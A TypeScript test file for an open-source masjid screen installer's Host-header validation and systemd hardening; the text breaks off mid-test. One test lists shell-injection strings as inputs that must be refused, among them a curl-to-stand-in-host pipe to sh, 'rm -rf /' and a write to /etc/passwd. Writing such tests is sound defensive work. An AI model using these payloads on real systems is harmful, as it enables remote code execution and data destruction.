// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 OpenMasjid-Solutions
/**
 * The install one-liner, and the one thing about it that has to be right.
 *
 * `/pi.sh` writes an address into a shell script, and that address comes out of the request's
 * `Host` header — which is set by whoever is calling. That makes this the only place in the app
 * where untrusted input is interpolated into something a machine will later *execute*, so the
 * tests here are about the boundary rather than the feature: what gets refused, and what the
 * refused thing would otherwise have done.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import { execFileSync } from 'node:child_process';
import path from 'node:path';
import type { IncomingMessage } from 'node:http';
import { originFor, renderInstaller, installerTemplate } from './piInstaller';

const req = (headers: Record<string, string>, encrypted = false): IncomingMessage =>
  ({ headers, socket: { encrypted } }) as unknown as IncomingMessage;

// ── working out this server's address ────────────────────────────────────────

test('the address a Pi is told to use is the one it was curled from', () => {
  assert.equal(originFor(req({ host: '192.168.1.18:7860' }), '/pi.sh'), 'http://192.168.1.18:7860');
});

test('a direct TLS connection is reported as https', () => {
  assert.equal(originFor(req({ host: 'display.local' }, true), '/pi.sh'), 'https://display.local');
});

test('the platform ingress\'s forwarded headers win, since it is what a Pi can reach', () => {
  assert.equal(
    originFor(req({ host: 'internal:7860', 'x-forwarded-host': 'masjid.example', 'x-forwarded-proto': 'https' }), '/display/pi.sh'),
    'https://masjid.example/display',
  );
});

test('the tunnel prefix is kept, or the Pi would post to the platform root', () => {
  assert.equal(originFor(req({ host: 'h' }), '/display/pi.sh'), 'http://h/display');
  assert.equal(originFor(req({ host: 'h' }), '/pi.sh'), 'http://h');
});

test('a forwarded proto that is not https is treated as http, never passed through', () => {
  assert.equal(originFor(req({ host: 'h', 'x-forwarded-proto': 'gopher' }), '/pi.sh'), 'http://h');
});

test('a comma-joined forwarded chain uses the first hop', () => {
  assert.equal(
    originFor(req({ host: 'h', 'x-forwarded-host': 'first.example, second.example' }), '/pi.sh'),
    'http://first.example',
  );
});

test('an IPv6 literal is accepted in brackets', () => {
  assert.equal(originFor(req({ host: '[2001:db8::1]:7860' }), '/pi.sh'), 'http://[2001:db8::1]:7860');
});

// ── the part that would be a remote code execution if it were wrong ──────────

test('a Host header carrying shell syntax is refused, not sanitised', () => {
  // Each of these, substituted into `SERVER='…'` unchecked, ends the quoting and runs a command
  // on every Pi somebody sets up. A refusal is the only acceptable answer.
  const attacks = [
    "h';curl evil.sh|sh;'",
    'h$(id)',
    'h`id`',
    'h;reboot',
    'h\nSERVER=http://evil',
    'h"x',
    "h'x",
    'h x',
    'h|tee /etc/passwd',
    'h&&rm -rf /',
    'h\\',
    'h#comment',
    'h{a,b}',
    'h>out',
  ];
  for (const host of attacks) {
    assert.equal(originFor(req({ host }), '/pi.sh'), null, `accepted: ${JSON.stringify(host)}`);
  }
});

test('an attack routed through the forwarded header is refused too', () => {
  assert.equal(originFor(req({ host: 'ok', 'x-forwarded-host': "e';id;'" }), '/pi.sh'), null);
});

test('a missing or absurd Host is refused', () => {
  assert.equal(originFor(req({}), '/pi.sh'), null);
  assert.equal(originFor(req({ host: 'a'.repeat(300) }), '/pi.sh'), null);
  assert.equal(originFor(req({ host: 'h:999999' }), '/pi.sh'), null);
});

test('every accepted address is inert inside the script\'s single quotes', () => {
  // The second half of the guarantee: the charset cannot express an escape, AND the value lands
  // in single quotes. This asserts the property directly rather than trusting the pattern.
  const hosts = ['h', 'display.local', '192.168.1.18:7860', '[2001:db8::1]', 'a-b.c-d.example:65535'];
  for (const host of hosts) {
    const origin = originFor(req({ host }), '/pi.sh');
    assert.ok(origin, host);
    const line = `SERVER='${origin}'`;
    assert.ok(!/["`$\\\n\r;|&<>(){}]/.test(origin as string), `${origin} carries shell syntax`);
    assert.equal(line.split("'").length, 3, 'the value must not contain a quote of its own');
  }
});

// ── substitution ─────────────────────────────────────────────────────────────

test('every placeholder is filled in', () => {
  const out = renderInstaller("SERVER='@@SERVER@@' R='@@RESVG@@' A='@@AGENT_VERSION@@'", 'http://h', '2.6.2', '0.70.0-dev.8');
  assert.equal(out, "SERVER='http://h' R='2.6.2' A='0.70.0-dev.8'");
  assert.ok(!out.includes('@@'), 'a leftover placeholder is a Pi that installs and never connects');
});

test('a placeholder appearing twice is replaced every time', () => {
  assert.equal(renderInstaller('@@SERVER@@ and @@SERVER@@', 'x', '1', '1'), 'x and x');
});

test('a version string that is not a version cannot smuggle anything in', () => {
  const out = renderInstaller("R='@@RESVG@@'", 'http://h', "2.6.2';id;'", '0.1.0');
  assert.equal(out, "R='unknown'");
});

test('the real installer template renders with nothing left unfilled', () => {
  // Guards against renaming a placeholder in the script and not here, which would ship a Pi
  // installer with a literal @@SERVER@@ in it.
  const tpl = installerTemplate();
  assert.ok(tpl, 'the installer template should be findable from a source checkout');
  const out = renderInstaller(tpl as string, 'http://192.168.1.18:7860', '2.6.2', '0.70.0-dev.8');
  assert.ok(!out.includes('@@'), `unfilled placeholder: ${/@@[A-Z_]+@@/.exec(out)?.[0] ?? ''}`);
  assert.ok(out.includes("SERVER='http://192.168.1.18:7860'"));
});

test('the installer is POSIX sh, refuses to half-run, and never resets an adopted screen', () => {
  const tpl = installerTemplate() as string;
  assert.ok(tpl, 'template missing');
  // `set -eu`: a script piped into sh that half-runs leaves a Pi in a state nobody can describe.
  assert.ok(/^set -eu$/m.test(tpl), 'the installer must abort on the first failure');
  // The config is merged, not rewritten. A re-run that dropped the token would send somebody
  // back to the television to read a code that has already been used.
  assert.ok(/deviceSecret !== "string"/.test(tpl), 'the identity must only be minted when absent');
  assert.ok(!/rm -f? *"?\$CONF"?/.test(tpl), 'the installer must never delete the config');
  // Written through a temporary file: a power cut mid-write must not truncate the credentials.
  assert.ok(tpl.includes('fs.renameSync(tmp, file)'), 'the config write must be atomic');
  // Downloaded to .new and checked before being moved into place.
  // The temp name MUST end in .js. `node --check` infers the module format from the extension and
  // refuses anything it does not recognise — `agent.js.new` died with ERR_UNKNOWN_FILE_EXTENSION on
  // a real Pi, which turned the safety check into the thing that broke the install. The previous
  // version of this test asserted the broken name, so it enforced the bug rather than catching it.
  assert.ok(tpl.includes('node --check "$PREFIX/agent.new.js"'), 'a truncated download must not become the agent');
  // The updater checks a variable rather than a literal, so assert what the variable holds.
  assert.ok(tpl.includes('TMP="$PREFIX/agent.new.js"'), 'the updater temp file must end in .js too');
  assert.ok(
    !/agent\.js\.(new|prev)/.test(tpl),
    'no temp name may end in an extension node cannot parse — that is the bug this test exists for',
  );
});

test('the agent does not run as root', () => {
  const tpl = installerTemplate() as string;
  assert.ok(/^User=\$SERVICE_USER$/m.test(tpl), 'the long-running agent must drop privileges');
  // `render` joined this list for hardware H.265: the Pi's stateless HEVC decoder is reached through
  // /dev/dri/renderD128, which the video group does not cover. Still an exact match rather than a
  // substring — this is the account's whole privilege surface, and a group added carelessly here is
  // not something anybody would notice afterwards.
  assert.ok(/^SupplementaryGroups=video render tty$/m.test(tpl), 'and hold only the groups it needs');
  assert.ok(/^Restart=always$/m.test(tpl), 'a masjid screen must come back on its own');
});

test('the installer carries its licence header, like every other file here', () => {
  const p = path.resolve(__dirname, 'assets', 'pi', 'install.sh');
  const onDisk = fs.existsSync(p) ? fs.readFileSync(p, 'utf8') : (installerTemplate() as string);
  assert.ok(onDisk.startsWith('# SPDX-License-Identifier: AGPL-3.0-only'));
});

// ── keeping a masjid's screens current ───────────────────────────────────────

test('the agent cannot rewrite its own code — the updater is a separate root unit', () => {
  const tpl = installerTemplate() as string;
  // The whole point of splitting it out. A long-running, network-facing process that can rewrite
  // its own binary is a much larger thing to trust than one that cannot.
  const rwp = /^ReadWritePaths=(.*)$/m.exec(tpl)?.[1] ?? '';
  assert.ok(!rwp.includes('$PREFIX'), 'the agent must not have write access to /opt');
  assert.ok(rwp.includes('$CONFDIR') && rwp.includes('$STATEDIR'));
  assert.ok(tpl.includes('openmasjid-screen-update.timer'), 'updates run on their own timer');
  assert.ok(tpl.includes('ExecStart=/opt/openmasjid-screen/update.sh'));
});

test('an update that will not start is rolled back', () => {
  const tpl = installerTemplate() as string;
  // Without this a bad build takes every screen in the masjid dark until somebody notices and
  // knows what to do — and nobody is watching these.
  assert.ok(tpl.includes('agent.prev.js'), 'the previous agent must be kept');
  assert.ok(/is-active --quiet openmasjid-screen\.service/.test(tpl), 'and its replacement checked');
  assert.ok(/rolling back/.test(tpl));
});

test('a truncated download never becomes the running agent', () => {
  const tpl = installerTemplate() as string;
  // Both the installer and the updater check, because either can be interrupted.
  assert.equal((tpl.match(/node --check/g) ?? []).length, 2);
});

test('a masjid with a screen in every hall does not stampede the server', () => {
  const tpl = installerTemplate() as string;
  assert.ok(/RandomizedDelaySec=/.test(tpl), 'every Pi asking at the same second is a thundering herd');
  assert.ok(/OnUnitActiveSec=/.test(tpl));
});

// ── trusting a masjid's own display server ───────────────────────────────────
//
// Found on real hardware: the server was at https://192.168.1.18:8444 behind a self-signed
// certificate with no SAN for that address. curl refused the script; and Node's fetch would have
// refused everything afterwards too, since Node does not read /etc/ssl/certs — so the agent would
// have installed cleanly and then never connected.

test('a self-signed server is pinned, not waved through', () => {
  const tpl = installerTemplate() as string;
  assert.ok(/openssl s_client -connect/.test(tpl), 'it must take a copy of the certificate');
  assert.ok(tpl.includes('--cacert "$CA"'), 'and verify against that copy');
  assert.ok(/NODE_EXTRA_CA_CERTS=\$CA/.test(tpl), 'the agent must be given it too — Node ignores /etc/ssl/certs');
});

test('verification is only abandoned when the name cannot match, and never quietly', () => {
  const tpl = installerTemplate() as string;
  // Checks EVERY assignment, not the first mention of the name. The original used indexOf on the
  // bare string, and once a comment discussed the setting that indexOf started landing on prose —
  // so the test would have been examining an explanation instead of code. There are now two real
  // assignment sites (the original fallback, and the deferred re-check once node exists), and both
  // have to warn before they weaken anything.
  const lines = tpl.split('\n');
  const sites = lines
    .map((l, i) => [l, i] as const)
    .filter(([l]) => l.includes("NODE_TLS_ENV='Environment=NODE_TLS_REJECT_UNAUTHORIZED=0'") && !l.trim().startsWith('#'));
  assert.ok(sites.length >= 1, 'the fallback must exist');
  for (const [, i] of sites) {
    const before = lines.slice(Math.max(0, i - 40), i).filter((l) => !l.trim().startsWith('#'));
    assert.ok(
      before.some((l) => /^\s*warn /.test(l)),
      `the assignment at line ${i + 1} turns verification off without saying so`,
    );
  }
});

test('even the fallback pins the public key, so an impostor is still refused', () => {
  // Plain -k accepts ANY certificate, including an attacker's. Pinning the key means they need
  // the private key rather than merely a position on the network. Verified against a real
  // impostor server: accepted the genuine one, rejected the impostor.
  const tpl = installerTemplate() as string;
  assert.ok(tpl.includes('--pinnedpubkey sha256//'), 'the mismatch path must pin the key');
  assert.ok(/openssl x509 -in "\$CA" -pubkey -noout/.test(tpl));
});

test('the updater makes the same trust decision, or self-update stops forever', () => {
  const tpl = installerTemplate() as string;
  // The updater is a separate script with no access to the installer's variables, so the decision
  // is handed to it in a file. It must not try to re-derive it — an earlier version read the flag
  // out of config.json, which the agent overwrites on adoption, so within minutes of every install
  // the updater was guessing, guessing wrong, and failing silently every six hours forever.
  const upd = tpl.slice(tpl.indexOf('cat > "$PREFIX/update.sh"'));
  assert.ok(upd.includes('. "$PREFIX/trust.env"'), 'it must read the decision the installer wrote');
  assert.ok(/curl -fsSL --max-time 120 \$CURL_OPTS/.test(upd), 'and actually pass it to curl');
  // And the installer must have written that file for every branch, including plain HTTP.
  assert.ok(tpl.includes(`printf "CURL_OPTS='%s'`), 'trust.env must carry the curl options');
  assert.ok(tpl.includes(`printf "SERVER='%s'`), 'and the server address');
});

// ── an install that looks hung is an install people reboot half-done ─────────

test('apt is not silenced, and cannot wait forever', () => {
  const tpl = installerTemplate() as string;
  // A freshly booted Pi runs unattended-upgrades, which holds the dpkg lock. With -qq and
  // >/dev/null the installer sat there printing nothing for over fifteen minutes.
  assert.ok(!/apt-get[^\n]*-qq[^\n]*install/.test(tpl), 'apt install must not be quiet');
  assert.ok(!/apt-get[^\n]*install[^\n]*>\s*\/dev\/null/.test(tpl), 'nor have its output discarded');
  assert.ok(tpl.includes('DPkg::Lock::Timeout'), 'apt must not block on the lock indefinitely');
  assert.ok(tpl.includes('wait_for_apt'), 'and should say who is holding it');
});

test('the slow steps announce themselves before they run', () => {
  const tpl = installerTemplate() as string;
  assert.ok(/^STEPS=(\d+)$/m.test(tpl));
  const declared = Number(/^STEPS=(\d+)$/m.exec(tpl)?.[1]);
  const calls = (tpl.match(/^step /gm) ?? []).length;
  assert.equal(calls, declared, 'the step counter must match the number of steps');
  assert.ok(!/npm install[^\n]*>\s*\/dev\/null/.test(tpl), 'the npm install must not be silent either');
});

test('ffmpeg failing does not cost you the timetable', () => {
  const tpl = installerTemplate() as string;
  // It is the largest download by far and the only part not needed to show prayer times.
  const i = tpl.indexOf('Installing ffmpeg');
  assert.ok(i > 0, 'ffmpeg should be its own step');
  const block = tpl.slice(i, i + 900);
  assert.ok(/if apt-get .*ffmpeg; then/.test(block), 'its failure must be handled, not fatal');
  assert.ok(/warn /.test(block));
});

// ── found by an adversarial review of the trust model ────────────────────────

test('the trust decision does not live in the file the agent overwrites', () => {
  // The bug this prevents: the agent rewrites config.json on adoption, keeping only the keys it
  // knows about — so an install-time setting stored there was destroyed minutes after setup. The
  // updater then fell back to a handshake already known to fail on that device and stopped
  // updating forever, silently, while its timer kept looking healthy.
  const tpl = installerTemplate() as string;
  const upd = tpl.slice(tpl.indexOf('cat > "$PREFIX/update.sh"'));
  assert.ok(!upd.includes('insecureTls'), 'the updater must not read trust state out of config.json');
  assert.ok(upd.includes('. "$PREFIX/trust.env"'), 'it must source the installer-written file instead');
  assert.ok(tpl.includes('TRUSTENV="$PREFIX/trust.env"'));
  // And that file must live where the agent cannot write it.
  const rwp = /^ReadWritePaths=(.*)$/m.exec(tpl)?.[1] ?? '';
  assert.ok(!rwp.includes('$PREFIX'), 'trust.env would be agent-writable if /opt were writable');
});

test('the pin is validated with the client that has to live with it', () => {
  // curl and Node are different TLS stacks. Checking only curl can print "pinned — verified" and
  // then hand over a screen whose agent cannot make a single request, with nothing to catch it.
  //
  // Node's half now lives in node_accepts_ca rather than inline, because it cannot be asked before
  // node is installed — see the fresh-install bug its neighbours describe. The property is
  // unchanged: node IS asked, and asked the same way the agent asks.
  const tpl = installerTemplate() as string;
  const fn = tpl.slice(tpl.indexOf('node_accepts_ca() {'));
  const body = fn.slice(0, fn.indexOf('\n}\n'));
  assert.ok(body.length > 0, 'node_accepts_ca must exist');
  assert.match(body, /NODE_EXTRA_CA_CERTS="\$CA" node -e/, 'Node must be asked too, not just curl');
  assert.ok(body.includes('fetch('), 'and asked the same way the agent asks');
  assert.ok(body.includes('redirect: "error"'), 'including the redirect guard the agent uses');
  // And the trust decision must actually consult it.
  const trust = tpl.slice(tpl.indexOf('--cacert "$CA"'), tpl.indexOf('pinned the server'));
  assert.match(trust, /node_accepts_ca/, 'the pin decision must consult node');
});

test('an unreachable server is a refusal, not a silent downgrade', () => {
  // Otherwise a temporary network problem permanently weakens the device, at the one moment
  // nobody would notice: the install carries on and the downgrade is never mentioned again.
  const tpl = installerTemplate() as string;
  const i = tpl.indexOf("could not reach");
  assert.ok(i > 0, 'the unreachable case must be handled explicitly');
  const block = tpl.slice(Math.max(0, i - 300), i + 300);
  assert.ok(/die "could not reach/.test(block), 'it must abort rather than continue');
  assert.ok(!/CURL_OPTS='-k'/.test(block), 'and must not fall through to no verification');
});

test('the hardening does not break the things the agent actually needs', () => {
  const tpl = installerTemplate() as string;
  // Dropping AF_NETLINK looks like tightening and is not: enumerating this machine's own network
  // interfaces goes through netlink, so the agent crashed on startup every five seconds, and
  // glibc's DNS resolution uses it too — ffmpeg would not have resolved a camera by name.
  const fams = /^RestrictAddressFamilies=(.*)$/m.exec(tpl)?.[1] ?? '';
  for (const f of ['AF_INET', 'AF_INET6', 'AF_UNIX', 'AF_NETLINK']) {
    assert.ok(fams.includes(f), `${f} is required — see the comment above this directive`);
  }
});

test('the console is taken off the screen only once something can replace it', () => {
  const tpl = installerTemplate() as string;
  // Unbinding early left the television frozen on whatever boot message was printing at that
  // instant, which reads exactly like a machine stuck in a loop.
  const i = tpl.indexOf('openmasjid-screen-console.service <<');
  assert.ok(i > 0);
  const unit = tpl.slice(i, i + 1400);
  assert.ok(/^After=openmasjid-screen\.service$/m.test(unit), 'the console unit must run AFTER the agent');
  assert.ok(!/^Before=openmasjid-screen\.service$/m.test(unit), 'never before — that is the frozen-screen bug');
});

test('nothing in the expanded heredocs can be executed by accident', () => {
  // The unit files are written with an UNQUOTED heredoc so the installer can substitute settings
  // into them. That makes backticks and $( ) inside command substitution rather than punctuation,
  // and `sh -n` cannot catch it because heredocs expand at run time, not parse time.
  //
  // A code reference written in backticks inside a COMMENT there was executed by dash, which read
  // it as a function definition with an invalid name and killed the installer at its final step
  // on a real Pi. Only the intended variables may expand.
  const tpl = installerTemplate() as string;
  const lines = tpl.split('\n');
  const allowed = new Set(['$NODE_TLS_ENV', '$SERVICE_USER', '$PREFIX', '$CONFDIR', '$STATEDIR']);
  let inside = false;
  const offenders: string[] = [];
  for (const [i, line] of lines.entries()) {
    if (/<<UNIT$/.test(line)) inside = true;
    else if (/^UNIT$/.test(line)) inside = false;
    else if (inside) {
      if (line.includes('`')) offenders.push(`${i + 1}: backtick -> ${line.trim()}`);
      if (line.includes('$(')) offenders.push(`${i + 1}: $( ) -> ${line.trim()}`);
      for (const m of line.match(/\$[A-Za-z_][A-Za-z0-9_]*/g) ?? []) {
        if (!allowed.has(m)) offenders.push(`${i + 1}: unexpected ${m} -> ${line.trim()}`);
      }
    }
  }
  assert.deepEqual(offenders, [], `command substitution or an unknown variable in an expanded heredoc:\n${offenders.join('\n')}`);
});

test('the root dispatcher removes a request BEFORE acting on it', () => {
  // A request still present after the action would retrigger the .path unit and repeat it for ever.
  const tpl = installerTemplate() as string;
  const ctl = tpl.slice(tpl.indexOf('cat > "$PREFIX/control.sh"'));
  const del = ctl.indexOf('rm -f "$req"');
  const act = ctl.indexOf('"$PREFIX/update.sh"');
  assert.ok(del > 0 && act > 0, 'both the delete and the action must exist');
  assert.ok(del < act, 'the request must be unlinked first, or the screen loops');
});

test('the dispatcher runs a closed set of verbs with no escape hatch', () => {
  // A compromised agent can drop a file in the spool. It must not be able to invent a verb.
  const tpl = installerTemplate() as string;
  const ctl = tpl.slice(tpl.indexOf('cat > "$PREFIX/control.sh"'), tpl.indexOf('chmod 700 "$PREFIX/control.sh"'));
  assert.ok(/tr -dc 'a-z-'/.test(ctl), 'the verb must be reduced to a safe alphabet');
  assert.ok(/case "\$action" in/.test(ctl));
  assert.ok(/^\s*update\)/m.test(ctl), 'update is the only action');
  // The default branch must not execute anything.
  const def = /\*\)([\s\S]*?);;/.exec(ctl)?.[1] ?? '';
  assert.ok(!/\$\(|`|eval|sh |exec /.test(def), `the default branch runs something: ${def.trim()}`);
});

test('the spool is writable by the agent and the dispatcher is not', () => {
  const tpl = installerTemplate() as string;
  // The agent may leave a request...
  assert.ok(tpl.includes('mkdir -p "$STATEDIR/control"'));
  const rwp = /^ReadWritePaths=(.*)$/m.exec(tpl)?.[1] ?? '';
  assert.ok(rwp.includes('$STATEDIR'), 'the spool must be inside what the agent can write');
  // ...but must not be able to change what acts on it.
  assert.ok(!rwp.includes('$PREFIX'), 'control.sh must stay out of the agent\'s reach');
  assert.ok(tpl.includes('chmod 700 "$PREFIX/control.sh"'));
});

test('reboot is rate limited, or a screen can be taken off the wall for good', () => {
  // Nobody is watching a masjid screen. A reboot loop is not an inconvenience, it is a dead screen
  // until somebody drives there — so the limit is on the DEVICE, not in the panel that asked.
  const tpl = installerTemplate() as string;
  const ctl = tpl.slice(tpl.indexOf('cat > "$PREFIX/control.sh"'), tpl.indexOf('chmod 700 "$PREFIX/control.sh"'));
  assert.ok(/^\s*reboot\)/m.test(ctl), 'the verb must exist');
  assert.ok(/systemctl reboot/.test(ctl));
  assert.ok(/-lt 600/.test(ctl), 'one reboot per ten minutes at most');
  assert.ok(/last-reboot/.test(ctl), 'and the last one has to be remembered across reboots');
  // The remembered timestamp lives where the agent cannot forge it.
  assert.ok(/\$PREFIX\/last-reboot/.test(ctl), 'in /opt, which the agent cannot write');
  // A corrupt stamp must not read as "never rebooted, go ahead" AND must not crash the dispatcher.
  assert.ok(/\*\[!0-9\]\*/.test(ctl), 'a non-numeric stamp has to be handled');
});

test('the dispatcher still executes nothing outside its closed set', () => {
  // Adding a verb is exactly when this stops being true by accident.
  const tpl = installerTemplate() as string;
  const ctl = tpl.slice(tpl.indexOf('cat > "$PREFIX/control.sh"'), tpl.indexOf('chmod 700 "$PREFIX/control.sh"'));
  const verbs = [...ctl.matchAll(/^\s{4}([a-z|]+)\)/gm)].map((m) => m[1]);
  assert.deepEqual(verbs.sort(), ['reboot', 'reinstall', 'update'], `unexpected verbs: ${verbs.join(', ')}`);
  const def = /\*\)([\s\S]*?);;/.exec(ctl)?.[1] ?? '';
  assert.ok(!/\$\(|`|eval|exec /.test(def), `the default branch runs something: ${def.trim()}`);
});

test('the hardware video decoder is reachable by the agent', () => {
  // Diagnosed from a real Pi. /dev/video10 existed, bcm2835-codec said "Loaded V4L2 decode", and the
  // service account was in the `video` group — yet ffmpeg reported "Could not find a valid device"
  // on every attempt. The cause was this unit: naming ANY device in DeviceAllow turns it into an
  // ALLOWLIST, so the two entries for the framebuffer and the console were denying the codec nodes
  // regardless of their own permissions.
  const tpl = installerTemplate() as string;
  const allows = [...tpl.matchAll(/^DeviceAllow=(.*)$/gm)].map((m) => m[1]);
  assert.ok(allows.length > 0, 'the unit does use an allowlist');
  assert.ok(
    allows.some((a) => a.startsWith('char-video4linux')),
    `no V4L2 access in the allowlist: ${allows.join(' | ')}`,
  );
  // As a class, not a number: the codec node numbering is not stable across kernels.
  assert.ok(!allows.some((a) => /\/dev\/video\d/.test(a)), 'do not hardcode a video node number');
});

test('the decoder is given enough GPU memory to decode 1080p', () => {
  // The same Pi reported gpu=76M. bcm2835-codec is firmware-side, so it draws on the GPU split
  // rather than system RAM, and 76M is not enough for 1080p — which presents as the decoder simply
  // not being openable rather than as an error anybody can act on.
  const tpl = installerTemplate() as string;
  assert.ok(/gpu_mem=128/.test(tpl), 'the installer must raise the split');
  assert.ok(/grep -q '\^gpu_mem=' /.test(tpl), 'and must not fight an explicit setting already there');
});

test('re-running setup from the panel is fetched over the SAME verified channel', () => {
  // This is the one action where root fetches a shell script from the display server and runs it.
  // That is exactly what an admin does by hand to install a screen — but it can now happen with
  // nobody present, so it must not take a shortcut the manual path would not take.
  const tpl = installerTemplate() as string;
  const ctl = tpl.slice(tpl.indexOf('cat > "$PREFIX/control.sh"'), tpl.indexOf('chmod 700 "$PREFIX/control.sh"'));
  const branch = ctl.slice(ctl.indexOf('reinstall)'), ctl.indexOf('reboot)'));

  assert.ok(/\$CURL_OPTS/.test(branch), 'it must use the pinned certificate, like every other fetch');
  assert.ok(/"\$SERVER\/pi\.sh"/.test(branch), 'and only ever this server');
  assert.ok(!/-k\b/.test(branch), 'never with verification disabled');
  // A truncated download must not be executed as root.
  assert.ok(/sh -n "\$TMP"/.test(branch), 'the script must parse before it is run');
  assert.ok(/\[ -s "\$TMP" \]/.test(branch), 'and must not be empty');
  // Rate limited, remembered where the agent cannot forge it.
  assert.ok(/-lt 300/.test(branch), 'one re-run per five minutes at most');
  assert.ok(/\$PREFIX\/last-reinstall/.test(branch), 'in /opt, which the agent cannot write');
  assert.ok(/\*\[!0-9\]\*/.test(branch), 'a corrupt timestamp must not read as "never"');
});

test('re-running setup does not deadlock against the unit that triggered it', () => {
  // The installer restarts openmasjid-screen, and this dispatcher was itself started by a path unit
  // watching a directory that service writes to. Running it in the foreground makes systemd wait on
  // a unit it is still starting.
  const tpl = installerTemplate() as string;
  const ctl = tpl.slice(tpl.indexOf('cat > "$PREFIX/control.sh"'), tpl.indexOf('chmod 700 "$PREFIX/control.sh"'));
  assert.ok(/setsid sh "\$TMP"/.test(ctl), 'the installer must be detached from the one-shot');
});

test('control.sh can actually reach the server it is told to reinstall from', () => {
  // This shipped broken. control.sh is written with a QUOTED heredoc (<<'CTL'), so nothing inside
  // it is substituted when the installer writes it — $SERVER in that file is a runtime variable,
  // not a baked-in address. It was never assigned and never sourced, so it was simply empty, and
  // the reinstall branch took its "no server address" path every single time. The panel's Update
  // button had just been changed to send `reinstall`, so Update silently did nothing at all.
  //
  // The failure is invisible from the outside: the command is accepted, acknowledged, and logged.
  // Only the screen's own log said why nothing happened.
  const tpl = installerTemplate() as string;
  const ctl = tpl.slice(tpl.indexOf('cat > "$PREFIX/control.sh"'), tpl.indexOf('chmod 700 "$PREFIX/control.sh"'));

  assert.ok(
    /^\s*\[ -f "\$PREFIX\/trust\.env" \] && \. "\$PREFIX\/trust\.env"/m.test(ctl),
    'control.sh must source trust.env — update.sh does, for exactly this reason',
  );

  // The general form of the same bug: every variable control.sh reads must be defined somewhere in
  // control.sh, since the quoted heredoc guarantees the installer contributes nothing to it.
  const assigned = new Set<string>();
  for (const m of ctl.matchAll(/^\s*(?:export\s+)?([A-Za-z_][A-Za-z0-9_]*)=/gm)) assigned.add(m[1]);
  for (const m of ctl.matchAll(/\bfor\s+([A-Za-z_][A-Za-z0-9_]*)\s+in\b/g)) assigned.add(m[1]);
  // trust.env is the installer's own file; these are the two settings it is documented to carry.
  if (/trust\.env/.test(ctl)) { assigned.add('SERVER'); assigned.add('CURL_OPTS'); }

  const shellProvided = new Set(['PATH', 'HOME', 'IFS', 'PWD', '1', '2', '@', '*', '?', '#', '$', '!', '0']);
  const used = new Set<string>();
  for (const m of ctl.matchAll(/\$\{?([A-Za-z_][A-Za-z0-9_]*)/g)) used.add(m[1]);

  const undefinedVars = [...used].filter((v) => !assigned.has(v) && !shellProvided.has(v));
  assert.deepEqual(
    undefinedVars,
    [],
    `control.sh reads variables nothing ever sets (the quoted heredoc substitutes nothing): ${undefinedVars.join(', ')}`,
  );
});

test('anything root writes back to the agent is left readable BY the agent', () => {
  // Root writes the Wi-Fi result; the agent reads it, reports it, and deletes it. The first version
  // left it root-owned at mode 0600, which the agent cannot open — so the outcome of every join was
  // written to a file nobody could read and never removed. The failure is silent in both directions:
  // the panel shows no result, and the file accumulates.
  const tpl = installerTemplate() as string;
  const ctl = tpl.slice(tpl.indexOf('cat > "$PREFIX/control.sh"'), tpl.indexOf('chmod 700 "$PREFIX/control.sh"'));

  const writes = ctl.split('\n').filter((l) => l.includes('> "$RES"'));
  assert.ok(writes.length >= 3, `expected the result file to be written on every outcome, saw ${writes.length}`);
  for (const line of writes) {
    assert.ok(
      line.includes('chown "$AGENT_USER" "$RES"'),
      `a result written without handing it to the agent is one the agent cannot read:\n  ${line.trim()}`,
    );
  }
  // And the user it is handed to has to be the one the service actually runs as.
  assert.match(tpl, /^AGENT_USER=omdscreen$/m);
  assert.match(tpl, /^SERVICE_USER=omdscreen$/m);
});

test('the Wi-Fi verbs survive the dispatcher\'s own character filter', () => {
  // The verb is read as `head -c 32 | tr -dc 'a-z-'`. A verb containing anything else silently
  // becomes a different string and falls through to "unknown request" — so the naming is load
  // bearing, not cosmetic.
  const tpl = installerTemplate() as string;
  const ctl = tpl.slice(tpl.indexOf('cat > "$PREFIX/control.sh"'), tpl.indexOf('chmod 700 "$PREFIX/control.sh"'));
  const lines = ctl.split('\n').map((l) => l.trim());
  for (const verb of ['wifi-on', 'wifi-off', 'wifi-join', 'wifi-forget', 'wifi-rescan']) {
    assert.equal(verb, verb.replace(/[^a-z-]/g, ''), `${verb} would not survive tr -dc 'a-z-'`);
    // A plain line comparison rather than a built regex — a backslash in a constructed pattern is
    // one editing round away from silently matching nothing, which is how this test first passed
    // while asserting almost nothing.
    assert.ok(lines.includes(`${verb})`), `the dispatcher has no branch for ${verb}`);
  }
});

test('turning Wi-Fi off, or forgetting it, is refused when it is the only way back', () => {
  // A screen with no cable that loses its radio cannot be recovered from the dashboard, because the
  // dashboard reaches it over that radio. The panel also disables these buttons, but a disabled
  // button is a courtesy — this is the safeguard.
  const tpl = installerTemplate() as string;
  const ctl = tpl.slice(tpl.indexOf('cat > "$PREFIX/control.sh"'), tpl.indexOf('chmod 700 "$PREFIX/control.sh"'));
  for (const verb of ['wifi-off', 'wifi-forget']) {
    const branch = ctl.slice(ctl.indexOf(`${verb})`), ctl.indexOf(';;', ctl.indexOf(`${verb})`)));
    assert.match(branch, /ethernet:connected/, `${verb} must check for a cable first`);
    assert.match(branch, /refusing/, `${verb} must say why it refused`);
  }
});

test('a join is only reported as working once the SERVER has been reached over Wi-Fi', () => {
  const tpl = installerTemplate() as string;
  const ctl = tpl.slice(tpl.indexOf('cat > "$PREFIX/control.sh"'), tpl.indexOf('chmod 700 "$PREFIX/control.sh"'));
  const branch = ctl.slice(ctl.indexOf('wifi-join)'));

  // Bound to the interface, or with a cable still in the kernel answers from the CABLE and the test
  // proves nothing about the radio.
  assert.match(branch, /curl [^\n]*--interface wlan0/, 'the reachability test must be bound to wlan0');
  // The requested network must be the one we ended up on: a failed connect leaves wlan0 on the OLD
  // network, and every later check would then pass on the strength of that.
  assert.match(branch, /\$active" != "\$SSID/, 'it must confirm which network it actually joined');
  // And a failure has to undo itself, or a half-working profile outlives the attempt.
  assert.match(branch, /connection delete/, 'a failed join must remove the profile it created');
});

test('the board gate refuses a Pi 3 and lets a Pi 4 or newer through — run, not just read', () => {
  // Asserting that the text is present would not catch the thing most likely to be wrong here: the
  // sed expression. `[0-9]\+` is a GNU extension that works on Raspberry Pi OS and would never have
  // failed visibly, and this script is deliberately POSIX sh for dash. So the expression is lifted
  // out of the installer and actually executed.
  const tpl = installerTemplate() as string;
  const gate = /PI_GEN=\$\(printf '%s' "\$MODEL" \| sed -n '[^']+'\)/.exec(tpl);
